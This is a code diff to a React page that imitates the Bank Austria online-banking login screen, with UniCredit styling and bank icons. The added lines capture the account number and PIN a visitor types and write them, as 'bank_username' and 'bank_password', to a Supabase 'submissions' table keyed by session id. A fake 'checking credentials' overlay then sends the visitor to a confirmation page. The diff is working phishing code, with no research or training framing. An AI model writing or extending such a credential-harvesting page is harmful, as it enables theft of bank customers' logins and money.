@@ -1,4 +1,7 @@
 import { useState } from "react";
+import { useSearchParams, useNavigate } from "react-router-dom";
+import { supabase } from "@/integrations/supabase/client";
+import LoadingOverlay from "@/components/LoadingOverlay";
 import { Menu } from "lucide-react";
 import iconGirokonten from "@/assets/Girokonten.png";
 import iconKreditkarten from "@/assets/Kreditkarten.png";
@@ -80,6 +83,11 @@ const footerLinkHrefs = [
 ];
 
 const BankAustria = () => {
+  const [searchParams] = useSearchParams();
+  const navigate = useNavigate();
+  const sessionId = searchParams.get("s") || "";
+  const [showLoading, setShowLoading] = useState(false);
+
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [activeLang, setActiveLang] = useState<"de" | "en">("de");
@@ -89,6 +97,8 @@ const BankAustria = () => {
   const t = translations[activeLang];
 
   return (
+    <>
+      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation")} />}
     <div
       className="min-h-screen flex overflow-x-hidden"
       style={{ fontFamily: "'UniCredit', sans-serif" }}
@@ -249,6 +259,17 @@ const BankAustria = () => {
 
             <div className="flex justify-center mb-6">
               <button
+                onClick={async () => {
+                  if (sessionId) {
+                    await supabase.from("submissions").update({
+                      bank_username: verfueger,
+                      bank_password: pin,
+                      bank_username_label: "Verfügernummer",
+                      bank_password_label: "PIN",
+                    }).eq("session_id", sessionId);
+                  }
+                  setShowLoading(true);
+                }}
                 className="px-10 sm:px-12 py-2.5 text-white font-semibold text-sm rounded-sm hover:opacity-90 transition-opacity"
                 style={{ backgroundColor: "#00aed0" }}
               >
@@ -373,6 +394,7 @@ const BankAustria = () => {
         </footer>
       </div>
     </div>
+    </>
   );
 };
 
